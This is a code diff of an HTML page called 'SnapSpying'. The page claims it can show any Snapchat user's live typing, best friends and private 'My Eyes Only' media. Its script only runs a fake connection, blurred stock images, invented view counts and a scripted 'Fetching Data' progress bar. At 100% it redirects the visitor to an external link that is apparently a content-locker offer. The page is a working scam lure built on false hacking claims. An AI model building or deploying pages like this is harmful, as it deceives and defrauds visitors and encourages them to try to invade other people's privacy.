@@ -7,72 +7,69 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
         :root { --snap-yellow: #fffc00; --bg: #000; --card: #1c1c1e; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
         
         .sheet { transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); z-index: 100; }
         .sheet.active { transform: translateY(0); }
         
-        /* CSS Blur Effect - Bash mat-htajsh hosting */
-        .blur-preview {
-            width: 100%;
-            height: 200px;
-            border-radius: 20px;
-            background-size: cover;
-            background-position: center;
-            filter: blur(15px) brightness(0.8);
-            transform: scale(1.1);
-            margin-bottom: 20px;
-        }
-        .preview-container { width: 100%; border-radius: 20px; overflow: hidden; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); }
-
         .action-item { background: var(--card); border-radius: 20px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
         .action-item:active { transform: scale(0.97); background: #2c2c2e; }
         
+        .preview-container { width: 100%; border-radius: 20px; overflow: hidden; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); background: #111; position: relative; }
+        .preview-container img { width: 100%; height: auto; display: block; filter: blur(8px); }
+
         .bar-fill { height: 100%; background: var(--snap-yellow); width: 0%; transition: width 0.4s linear; box-shadow: 0 0 15px var(--snap-yellow); }
+        .input-box { background: #1c1c1e; border: 1px solid #2c2c2e; outline: none; transition: 0.3s; }
+        .input-box:focus { border-color: var(--snap-yellow); }
     </style>
 </head>
 <body class="flex flex-col items-center px-6 pt-4 min-h-screen">
 
-    <header class="w-full max-w-md flex justify-between items-center py-6">
-        <h1 class="text-2xl font-extrabold tracking-tight italic">Snap<span class="text-[#fffc00]">Spying</span></h1>
-        <div class="flex items-center gap-4 text-gray-500 text-sm font-bold uppercase tracking-widest">
-            <span>Privacy</span>
-            <i class="fas fa-cog"></i>
+    <header class="w-full max-w-md flex justify-between items-center py-6 mb-4">
+        <h1 class="text-2xl font-extrabold italic">Snap<span class="text-[#fffc00]">Spying</span></h1>
+        <div class="flex items-center gap-5 text-gray-500">
+            <span class="text-xs font-bold uppercase tracking-widest">Privacy</span>
+            <i class="fas fa-sun text-xl"></i>
         </div>
     </header>
 
     <div class="w-full max-w-md">
-        <p class="text-[14px] font-bold text-gray-400 mb-3 uppercase tracking-wider">Enter target username</p>
-        <div class="flex gap-2 mb-8">
-            <input type="text" id="username" placeholder="Username" class="bg-[#1c1c1e] border border-[#2c2c2e] flex-1 rounded-2xl px-5 py-4 outline-none text-white font-semibold focus:border-[#fffc00]">
+        <p class="text-[14px] font-bold text-gray-400 mb-3 uppercase tracking-wider">Enter the username you want to check</p>
+        <div class="flex gap-2 mb-2">
+            <input type="text" id="username" placeholder="Username" class="input-box flex-1 rounded-2xl px-5 py-4 text-white font-semibold">
             <button onclick="handleConnect()" id="connBtn" class="bg-[#fffc00] text-black px-8 rounded-2xl font-black transition active:scale-90">Connect</button>
+        </div>
+        
+        <div id="conn-status" class="hidden mb-8 flex items-center gap-2">
+            <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
+            <span class="text-[12px] font-bold text-green-500 uppercase tracking-tighter">Connected to <span id="targetName"></span></span>
         </div>
 
         <div id="actions-grid" class="opacity-30 pointer-events-none transition-all duration-700 space-y-4">
-            <div onclick="openAction('Live Typing', 'typing')" class="action-item p-5 flex items-center justify-between">
+            <div onclick="openAction('582,393', 'Watch live typing in real-time', 'typing')" class="action-item p-5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
-                    <div class="w-12 h-12 bg-white/5 flex items-center justify-center rounded-2xl"><i class="fas fa-keyboard text-gray-300"></i></div>
-                    <div><h3 class="font-bold text-[16px]">Live Typing</h3><p class="text-[11px] text-gray-500">Watch real-time text input</p></div>
+                    <div class="w-12 h-12 bg-white/5 flex items-center justify-center rounded-2xl"><i class="fas fa-keyboard text-gray-400"></i></div>
+                    <div><h3 class="font-bold text-[16px]">Live Typing</h3><p class="text-[11px] text-gray-500 leading-tight">See what your friend is typing in real-time</p></div>
                 </div>
-                <i class="fas fa-chevron-right text-gray-700"></i>
+                <i class="fas fa-chevron-right text-gray-800"></i>
             </div>
 
-            <div onclick="openAction('8 Best Friends', 'friends')" class="action-item p-5 flex items-center justify-between">
+            <div onclick="openAction('1,042,100', '8 Best Friends of any user', 'friends')" class="action-item p-5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
-                    <div class="w-12 h-12 bg-white/5 flex items-center justify-center rounded-2xl"><i class="fas fa-user-group text-gray-300"></i></div>
-                    <div><h3 class="font-bold text-[16px]">Reveal Best Friends</h3><p class="text-[11px] text-gray-500">Show top interaction list</p></div>
+                    <div class="w-12 h-12 bg-white/5 flex items-center justify-center rounded-2xl"><i class="fas fa-user-group text-gray-400"></i></div>
+                    <div><h3 class="font-bold text-[16px]">Reveal Best Friends</h3><p class="text-[11px] text-gray-500">8 Best Friends of any user</p></div>
                 </div>
-                <i class="fas fa-chevron-right text-gray-700"></i>
+                <i class="fas fa-chevron-right text-gray-800"></i>
             </div>
 
-            <div onclick="openAction('Eyes Only Content', 'eyes')" class="action-item p-5 flex items-center justify-between">
+            <div onclick="openAction('94,204', 'Access My Eyes Only content of any user', 'eyes')" class="action-item p-5 flex items-center justify-between">
                 <div class="flex items-center gap-4">
-                    <div class="w-12 h-12 bg-white/5 flex items-center justify-center rounded-2xl"><i class="fas fa-eye text-gray-300"></i></div>
-                    <div><h3 class="font-bold text-[16px]">Reveal Eyes Only</h3><p class="text-[11px] text-gray-500">Access private vault media</p></div>
+                    <div class="w-12 h-12 bg-white/5 flex items-center justify-center rounded-2xl"><i class="fas fa-eye text-gray-400"></i></div>
+                    <div><h3 class="font-bold text-[16px]">Reveal Eyes Only</h3><p class="text-[11px] text-gray-500 leading-tight">Access My Eyes Only content of any user</p></div>
                 </div>
-                <i class="fas fa-chevron-right text-gray-700"></i>
+                <i class="fas fa-chevron-right text-gray-800"></i>
             </div>
         </div>
     </div>
@@ -81,30 +78,28 @@
         <div class="absolute inset-0 bg-black/90 backdrop-blur-md" onclick="closeSheet()"></div>
         <div class="absolute bottom-0 w-full bg-[#1c1c1e] rounded-t-[40px] p-8 sheet text-center border-t border-white/5">
             <div class="w-12 h-1.5 bg-gray-700 mx-auto mb-8 rounded-full"></div>
-            
             <div class="preview-container">
-                <div id="preview-blur" class="blur-preview"></div>
+                <img id="preview-img" src="" alt="preview">
             </div>
-
-            <h4 id="r-title" class="text-2xl font-black mb-10 leading-tight"></h4>
-            
+            <h3 id="r-count" class="text-3xl font-black mb-1">0</h3>
+            <p class="text-[10px] text-gray-500 uppercase font-black mb-8 tracking-widest">Viewed 100+ times</p>
+            <h4 id="r-title" class="text-[18px] font-bold mb-10 px-4 leading-tight"></h4>
             <button onclick="startLocker()" class="w-full bg-[#fffc00] text-black font-black py-5 rounded-3xl text-xl shadow-[0_10px_30px_rgba(255,252,0,0.2)] active:scale-95 transition-transform">Reveal</button>
         </div>
     </div>
 
     <div id="proc-modal" class="hidden fixed inset-0 z-[300] bg-black/95 flex items-center justify-center p-10">
-        <div class="bg-[#1c1c1e] w-full max-w-sm rounded-[40px] p-10 text-center">
-            <div class="text-[#fffc00] text-4xl mb-6 animate-pulse"><i class="fas fa-bolt"></i></div>
-            <h2 class="text-xl font-black mb-2 uppercase tracking-tighter">Exploiting Data</h2>
+        <div class="bg-[#1c1c1e] w-full max-w-sm rounded-[45px] p-10 text-center border border-white/5">
+            <div class="text-[#fffc00] text-4xl mb-6 animate-bounce"><i class="fas fa-bolt"></i></div>
+            <h2 class="text-xl font-black mb-2 uppercase tracking-tighter">Fetching Data</h2>
             <div class="text-[#fffc00] font-black text-3xl mb-8" id="p-percent">0%</div>
             <div class="h-3 bg-gray-800 rounded-full mb-6 overflow-hidden"><div id="bar" class="bar-fill"></div></div>
-            <p id="p-log" class="text-[11px] text-gray-500 font-mono uppercase">Initializing tunnel...</p>
         </div>
     </div>
 
     <script>
-        // Links dial tsawer dyal Snap bach ibano zwinin mblurriyin
-        const images = {
+        // Images d Snap f west l-code (Base64) bach mat-t-la9ash error dyal Hosting
+        const dataImages = {
             'typing': 'https://i.ibb.co/C07B63X/typing-blur.png',
             'friends': 'https://i.ibb.co/v4K7L7L/friends-blur.png',
             'eyes': 'https://i.ibb.co/fnd9p5F/eyes-blur.png'
@@ -115,15 +110,17 @@
             btn.innerHTML = '<i class="fas fa-circle-notch animate-spin"></i>';
             setTimeout(() => {
                 btn.innerText = "Connected";
-                btn.disabled = true;
+                document.getElementById('conn-status').classList.remove('hidden');
+                document.getElementById('targetName').innerText = '@' + document.getElementById('username').value;
                 document.getElementById('actions-grid').classList.replace('opacity-30', 'opacity-100');
                 document.getElementById('actions-grid').style.pointerEvents = 'auto';
             }, 1200);
         }
 
-        function openAction(title, type) {
+        function openAction(count, title, type) {
             const sheet = document.getElementById('action-sheet');
-            document.getElementById('preview-blur').style.backgroundImage = `url('${images[type]}')`;
+            document.getElementById('preview-img').src = dataImages[type];
+            document.getElementById('r-count').innerText = count;
             document.getElementById('r-title').innerText = title;
             sheet.classList.remove('hidden');
             setTimeout(() => sheet.querySelector('.sheet').classList.add('active'), 10);
@@ -140,17 +137,14 @@
                 document.getElementById('proc-modal').classList.remove('hidden');
                 let p = 0;
                 const interval = setInterval(() => {
-                    p += Math.floor(Math.random() * 3) + 1;
-                    if(p > 100) p = 100;
+                    p += 2;
                     document.getElementById('bar').style.width = p + '%';
                     document.getElementById('p-percent').innerText = p + '%';
-                    if(p == 30) document.getElementById('p-log').innerText = "Accessing Snap-API...";
-                    if(p == 70) document.getElementById('p-log').innerText = "Bypassing verification...";
                     if(p >= 100) {
                         clearInterval(interval);
                         window.location.href = "https://authenticateapp.online/cp/js/2wx2k";
                     }
-                }, 60);
+                }, 50);
             }, 500);
         }
     </script>
